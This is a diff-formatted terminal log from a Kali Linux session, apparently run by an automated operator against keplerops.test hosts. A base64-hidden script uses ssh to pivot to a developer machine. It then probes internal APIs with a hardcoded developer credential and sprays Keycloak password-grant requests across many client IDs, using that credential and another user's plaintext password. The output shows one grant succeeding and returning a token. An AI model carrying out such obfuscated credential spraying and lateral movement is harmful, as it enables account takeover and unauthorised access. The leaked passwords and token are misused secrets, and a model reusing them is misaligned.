@@ -1,0 +1,50 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/p13.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKQj1odHRwczovL3N0YWZmLmtlcGxlcm9wcy50ZXN0Ckk9aHR0cHM6Ly9pZGVudGl0eS5rZXBsZXJvcHMudGVzdC9yZWFsbXMva2VwbGVyb3BzL3Byb3RvY29sL29wZW5pZC1jb25uZWN0L3Rva2VuCkRFVj0ncm93YW4uaXRvOmZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4bycKZWNobyAiIyMjIyMjIyMgaW5kZXhlciBiYXNpYyBkZXYiCmN1cmwgLXNTayAtbSAxMCAtLWNhY2VydCAkQ0EgLXUgIiRERVYiIC1pICJodHRwczovL2luZGV4ZXIua2VwbGVyb3BzLnRlc3QvYXBpL2NvbmZpZyIgfCBoZWFkIC0yMAplY2hvICIjIyMjIyMjIyBtYW5hZ2VkLWlkZW50aXRpZXMgZnVsbCBoZWFkZXJzIgpjdXJsIC1zU2sgLW0gMTAgLS1jYWNlcnQgJENBIC11ICIkREVWIiAtaSAtWCBQT1NUIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7fScgIiRCL2FwaS9tYW5hZ2VkLWlkZW50aXRpZXMvc3VwcG9ydC9zZXNzaW9uIiB8IGhlYWQgLTI1CmVjaG8gIiMjIyMjIyMjIEtleWNsb2FrIHBhc3N3b3JkIGdyYW50IGF0dGVtcHRzIgpmb3IgY2lkIGluIGFjY291bnQgYWRtaW4tY2xpIE9JREMtRklFTERLRVNULVNVUFBPUlQgZmllbGRrZXN0LXN1cHBvcnQga2VwbGVyb3BzLXN1cHBvcnQgc3VwcG9ydCBhc3Npc3RhbnQgc3RhZmY7IGRvCiAgZm9yIHB3IGluICdma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8nICdmaWVsZGxpbmstZGV2LTI4NDEnOyBkbwogICAgcj0kKGN1cmwgLXNTayAtbSAxMCAtLWNhY2VydCAkQ0EgLVggUE9TVCAtZCAiY2xpZW50X2lkPSRjaWQiIC1kICJncmFudF90eXBlPXBhc3N3b3JkIiAtZCAidXNlcm5hbWU9cm93YW4uaXRvIiAtLWRhdGEtdXJsZW5jb2RlICJwYXNzd29yZD0kcHciIC13ICd8JXtodHRwX2NvZGV9JyAiJEkiKQogICAgZWNobyAiY2lkPSRjaWQgcHc9JHtwdzowOjEyfSAtPiAkKGVjaG8gIiRyIiB8IHRhaWwgLWMgNDAwKSIKICBkb25lCmRvbmUKZWNobyAiIyMjIyMjIyMgS2V5Y2xvYWsgbWF5YSBhdHRlbXB0Igpmb3IgY2lkIGluIGFjY291bnQgT0lEQy1GSUVMREtFU1QtU1VQUE9SVCBmaWVsZGtlc3Qtc3VwcG9ydCBzdXBwb3J0OyBkbwogIHI9JChjdXJsIC1zU2sgLW0gMTAgLS1jYWNlcnQgJENBIC1YIFBPU1QgLWQgImNsaWVudF9pZD0kY2lkIiAtZCAiZ3JhbnRfdHlwZT1wYXNzd29yZCIgLWQgInVzZXJuYW1lPW1heWEucmFuc2NvbWJlIiAtLWRhdGEtdXJsZW5jb2RlICJwYXNzd29yZD1zV1FhMzEwODVGVFFla1poSFR4VXlmXzlFMW1hcnEwdXI4V05DS21UdG5rIiAtdyAnfCV7aHR0cF9jb2RlfScgIiRJIikKICBlY2hvICJjaWQ9JGNpZCAtPiAkKGVjaG8gIiRyIiB8IHRhaWwgLWMgNDAwKSIKZG9uZQpJTk5FUgplY2hvIERPTkVfTUFSS18kUkFORE9NCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/p13.sh; bash /tmp/p13.sh; echo DONEMARK_1795202215289$((6*7))
+######## indexer basic dev
+HTTP/1.1 403 Forbidden
+Server: FieldKest/1.0 Python/3.12.11
+Date: Fri, 20 Nov 2026 19:17:06 GMT
+Content-Type: application/json
+Content-Length: 26
+X-Content-Type-Options: nosniff
+X-Request-ID: 816ac6c2-b1b6-44b0-901c-a0e427f42eb2
+
+{"error":"access_denied"}
+######## managed-identities full headers
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 19:17:06 GMT
+Content-Length: 0
+Connection: keep-alive
+WWW-Authenticate: Negotiate
+
+######## Keycloak password grant attempts
+cid=account pw=fk_developer -> {"error":"unauthorized_client","error_description":"Client not allowed for direct access grants"}|400
+cid=account pw=fieldlink-de -> {"error":"unauthorized_client","error_description":"Client not allowed for direct access grants"}|400
+cid=admin-cli pw=fk_developer -> yb3BzIiwidHlwIjoiUmVmcmVzaCIsImF6cCI6ImFkbWluLWNsaSIsInNpZCI6IjExNzUwNjc4LTRiOGUtNDg0NS03ODg0LWZhYzc2MTNlMDM5NyIsInNjb3BlIjoiZW1haWwgcm9sZXMgYmFzaWMgYWNyIHdlYi1vcmlnaW5zIHByb2ZpbGUifQ.aySojEr44-mAKKHfVOKQzyhkouSYjSdYEMj0O-6X-fPN8RfiDbGBUymRitIUAF_buD49KOv1hOeq-jZYbwOAyA","token_type":"Bearer","not-before-policy":0,"session_state":"11750678-4b8e-4845-7884-fac7613e0397","scope":"email profile"}|200
+cid=admin-cli pw=fieldlink-de -> {"error":"invalid_grant","error_description":"Invalid user credentials"}|401
+cid=OIDC-FIELDKEST-SUPPORT pw=fk_developer -> {"error":"unauthorized_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=OIDC-FIELDKEST-SUPPORT pw=fieldlink-de -> {"error":"unauthorized_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=fieldkest-support pw=fk_developer -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=fieldkest-support pw=fieldlink-de -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=keplerops-support pw=fk_developer -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=keplerops-support pw=fieldlink-de -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=support pw=fk_developer -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=support pw=fieldlink-de -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=assistant pw=fk_developer -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=assistant pw=fieldlink-de -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=staff pw=fk_developer -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=staff pw=fieldlink-de -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+######## Keycloak maya attempt
+cid=account -> {"error":"unauthorized_client","error_description":"Client not allowed for direct access grants"}|400
+cid=OIDC-FIELDKEST-SUPPORT -> {"error":"unauthorized_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=fieldkest-support -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+cid=support -> {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}|401
+DONE_MARK_17637
